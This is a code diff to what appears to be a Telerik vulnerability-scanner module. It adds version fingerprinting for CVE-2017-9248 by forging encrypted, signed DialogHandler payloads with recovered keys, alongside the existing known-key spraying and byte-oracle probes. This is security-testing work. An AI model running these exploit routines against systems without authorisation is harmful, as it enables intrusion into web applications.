@@ -283,6 +283,9 @@ class telerik(BaseModule):
 
     async def setup(self):
         self._rau_confirmed = set()
+        # base_url -> Telerik version confirmed via the RAU upload path. The same install
+        # backs the DialogHandler, so an RAU-confirmed version enriches DH findings too.
+        self._rau_version_by_base = {}
         custom_secrets = self.config.get("custom_secrets", None)
         if custom_secrets:
             path = Path(custom_secrets).expanduser()
@@ -316,18 +319,24 @@ class telerik(BaseModule):
             await self._probe_rau(base_url, event)
             dh_url = await self._probe_dialoghandler(base_url, event)
             if dh_url:
-                await self._probe_dialoghandler_exploit(dh_url, event)
+                # RAU + DH run on the same Telerik.Web.UI install, so a version confirmed
+                # via the RAU upload path (rau_confirm_version=True) also applies to DH.
+                rau_version = self._rau_version_by_base.get(base_url)
+                await self._probe_dialoghandler_exploit(dh_url, event, rau_version)
             await self._probe_spellcheck(base_url, event)
             await self._probe_chartimage(base_url, event)
         elif event.type == "HTTP_RESPONSE":
             await self._carve_http_response(event)
 
-    async def _probe_dialoghandler_exploit(self, dh_url, event):
+    async def _probe_dialoghandler_exploit(self, dh_url, event, rau_version=None):
         """
         Known-key spray first (definitive: recovers the actual keys). If nothing matches,
         fall back to the dp_cryptomg baseline probe (chosen-plaintext byte-oracle test).
         Oracle only runs on PBKDF1_MS targets; the CVE-2017-9248 patch moved to PBKDF2
         specifically to defeat this attack, so probing PBKDF2 is wasted requests.
+
+        `rau_version`, when set, was confirmed by the RAU upload path on the same host —
+        both handlers back onto the same Telerik.Web.UI install, so the version applies.
         """
         kdf_mode = None
         if self.config.get("try_known_keys"):
@@ -340,7 +349,7 @@ class telerik(BaseModule):
             candidate_kdfs = (kdf_mode,) if kdf_mode in ("PBKDF1_MS", "PBKDF2") else ("PBKDF1_MS", "PBKDF2")
             for candidate in candidate_kdfs:
                 self.verbose(f"Spraying known keys against DialogHandler ({candidate})")
-                if await self._probe_dialoghandler_knownkey(dh_url, event, candidate):
+                if await self._probe_dialoghandler_knownkey(dh_url, event, candidate, rau_version=rau_version):
                     return
                 self.verbose(f"Known-key spray exhausted for {candidate}, no match")
         if self.config.get("probe_dialoghandler_oracle"):
@@ -353,7 +362,7 @@ class telerik(BaseModule):
             # KDF-specific error), the target could still be oracle-vulnerable — try anyway.
             if kdf_mode != "PBKDF2":
                 self.verbose("Running dp_cryptomg find_baseline byte-oracle probe (up to 81 requests)")
-                await self._probe_dialoghandler_oracle(dh_url, event)
+                await self._probe_dialoghandler_oracle(dh_url, event, rau_version=rau_version)
 
     def _base_url(self, event):
         if self.config.get("include_subdirs"):
@@ -510,6 +519,7 @@ class telerik(BaseModule):
             response = await self.helpers.request(url, method="POST", files=payload)
             if response and '"fileInfo":' in response.text:
                 self.verbose(f"RAU RCE confirmed on version {version}; benign file was uploaded to target")
+                self._rau_version_by_base[base_url] = version
                 await self.emit_event(
                     {
                         "host": str(event.host),
@@ -657,7 +667,7 @@ class telerik(BaseModule):
             return "PBKDF1_MS"
         return None
 
-    async def _probe_dialoghandler_oracle(self, dh_url, event):
+    async def _probe_dialoghandler_oracle(self, dh_url, event, rau_version=None):
         """
         Port of dp_cryptomg's find_baseline(): send crafted GET ?dp=<base64(4 bytes)>
         payloads iterating combinations of [0x00, 0x6b, 0x08]. A response containing
@@ -677,13 +687,14 @@ class telerik(BaseModule):
                 or "String was not recognized as a valid Boolean." in text
             ):
                 self.verbose(f"dp_cryptomg baseline probe leaked on 4-byte combo {combo!r}; oracle confirmed")
+                version_note = f" Version: [{rau_version}] (from RAU)" if rau_version else ""
                 await self.emit_event(
                     {
                         "host": str(event.host),
                         "url": dh_url,
                         "description": (
                             "Telerik DialogHandler is exploitable via CVE-2017-9248 byte-oracle "
-                            "key recovery (baseline probe leaked decryption state)"
+                            f"key recovery.{version_note}"
                         ),
                         "name": "Telerik DialogHandler Oracle (CVE-2017-9248)",
                         "severity": "CRITICAL",
@@ -696,7 +707,7 @@ class telerik(BaseModule):
                 return True
         return False
 
-    async def _probe_dialoghandler_knownkey(self, dh_url, event, kdf_mode):
+    async def _probe_dialoghandler_knownkey(self, dh_url, event, kdf_mode, rau_version=None):
         """Returns True if a known key pair was recovered and a finding emitted."""
         include_machinekeys = self.config.get("include_machinekeys", False)
         if kdf_mode == "PBKDF1_MS":
@@ -714,23 +725,112 @@ class telerik(BaseModule):
         else:
             return False
 
-        await self.emit_event(
-            {
-                "host": str(event.host),
-                "url": dh_url,
-                "description": (
-                    f"Telerik DialogHandler configured with a known hash/encryption key pair. "
-                    f"Hash key: [{hash_key}] Encryption key: [{enc_key}] KDF: [{kdf_mode}]"
-                ),
-                "name": "Telerik DialogHandler Known Key (CVE-2017-9248)",
-                "severity": "CRITICAL",
-                "confidence": "CONFIRMED",
-            },
-            "FINDING",
-            event,
-            context=f"{{module}} recovered a known Telerik key pair at {dh_url}",
-        )
+        # We have the keys — reuse them to identify the installed Telerik version
+        # via response-size delta from a fake-version baseline. Safe (no uploads).
+        # Emit follows the same pattern as RAU: CRITICAL/CONFIRMED when version is nailed,
+        # HIGH/HIGH with an "attempted but failed" note when it isn't.
+        self.verbose(f"Identifying DialogHandler Telerik version (baseline + {len(self.telerik_versions)} probes)")
+        version = await self._detect_dh_version(dh_url, hash_key, enc_key, kdf_mode)
+        # If DH probing didn't identify a version but RAU already did on this host, use that —
+        # same install, same Telerik.Web.UI.dll.
+        version_source = None
+        if version:
+            version_source = "DH probe"
+        elif rau_version:
+            version = rau_version
+            version_source = "RAU"
+
+        if version:
+            self.verbose(f"DH version identified: {version} (via {version_source})")
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": dh_url,
+                    "description": (
+                        f"Telerik DialogHandler configured with a known hash/encryption key pair "
+                        f"and identified version. Hash key: [{hash_key}] Encryption key: [{enc_key}] "
+                        f"KDF: [{kdf_mode}] Version: [{version}] (source: {version_source})"
+                    ),
+                    "name": "Telerik DialogHandler Known Key (CVE-2017-9248)",
+                    "severity": "CRITICAL",
+                    "confidence": "CONFIRMED",
+                },
+                "FINDING",
+                event,
+                context=f"{{module}} recovered a known Telerik key pair and version at {dh_url}",
+            )
+        else:
+            self.verbose("DH version detection exhausted; emitting HIGH keys-accepted finding")
+            await self.emit_event(
+                {
+                    "host": str(event.host),
+                    "url": dh_url,
+                    "description": (
+                        f"Telerik DialogHandler configured with a known hash/encryption key pair. "
+                        f"Hash key: [{hash_key}] Encryption key: [{enc_key}] KDF: [{kdf_mode}]. "
+                        "Version detection was attempted but failed — target's installed Telerik "
+                        "version is not in the candidate list."
+                    ),
+                    "name": "Telerik DialogHandler Known Key (CVE-2017-9248)",
+                    "severity": "HIGH",
+                    "confidence": "HIGH",
+                },
+                "FINDING",
+                event,
+                context=f"{{module}} recovered a known Telerik key pair (version unknown) at {dh_url}",
+            )
         return True
+
+    async def _detect_dh_version(self, dh_url, hash_key, enc_key, kdf_mode):
+        """
+        Once keys are known, iterate versions in the DialogTypeName plaintext to identify the
+        installed Telerik.Web.UI. Mirrors badsecrets DialogHandler.probe_version: fake-version
+        9999.9.999 gives us a baseline response size; a real installed version produces a
+        response ~10+ bytes off baseline because the assembly loads and the dialog code
+        proceeds further.
+        """
+        baseline_size = await self._dh_version_probe_size(dh_url, "9999.9.999", hash_key, enc_key, kdf_mode)
+        if baseline_size is None:
+            self.verbose("DH version baseline probe failed")
+            return None
+        for version in self.telerik_versions:
+            size = await self._dh_version_probe_size(dh_url, version, hash_key, enc_key, kdf_mode)
+            if size is None:
+                continue
+            if abs(size - baseline_size) > 10:
+                self.verbose(f"DH version identified: {version} (size delta {size - baseline_size})")
+                return version
+        return None
+
+    async def _dh_version_probe_size(self, dh_url, version, hash_key, enc_key, kdf_mode):
+        """
+        Build a DialogParameters payload with `version` in the DialogTypeName field and return
+        the target's response length (or None on network failure). Payload skeleton matches
+        badsecrets DialogHandler.probe_version's non-modern form.
+        """
+        b64section_plain = (
+            f"Telerik.Web.UI.Editor.DialogControls.DocumentManagerDialog, Telerik.Web.UI, "
+            f"Version={version}, Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+        )
+        b64section = base64.b64encode(b64section_plain.encode()).decode()
+        plaintext = (
+            "EnableAsyncUpload,False,3,True;DeletePaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;"
+            "EnableEmbeddedBaseStylesheet,False,3,True;RenderMode,False,2,2;"
+            "UploadPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;SearchPatterns,True,0,S2k0cQ==;"
+            "EnableEmbeddedSkins,False,3,True;MaxUploadFileSize,False,1,204800;"
+            "LocalizationPath,False,0,;FileBrowserContentProviderTypeName,False,0,;"
+            "ViewPaths,True,0,Zmk4dUx3PT0sZmk4dUx3PT0=;IsSkinTouch,False,3,False;"
+            "ExternalDialogsPath,False,0,;Language,False,0,ZW4tVVM=;"
+            f"Telerik.DialogDefinition.DialogTypeName,False,0,{b64section};"
+            "AllowMultipleSelection,False,3,False"
+        )
+        derived_key, derived_iv = self._enc.telerik_derivekeys(enc_key, kdf_mode)
+        ct = self._enc.telerik_encrypt(derived_key, derived_iv, plaintext)
+        signed = self._hash.sign_enc_dialog_params(hash_key, ct)
+        response = await self.helpers.request(dh_url, method="POST", data={"dialogParametersHolder": signed})
+        if not response:
+            return None
+        return len(response.text)
 
     async def _solve_dh_hashkey(self, dh_url, include_machinekeys):
         """PBKDF1_MS mode: hashkey solves independently via 'input data is not a complete block' oracle."""
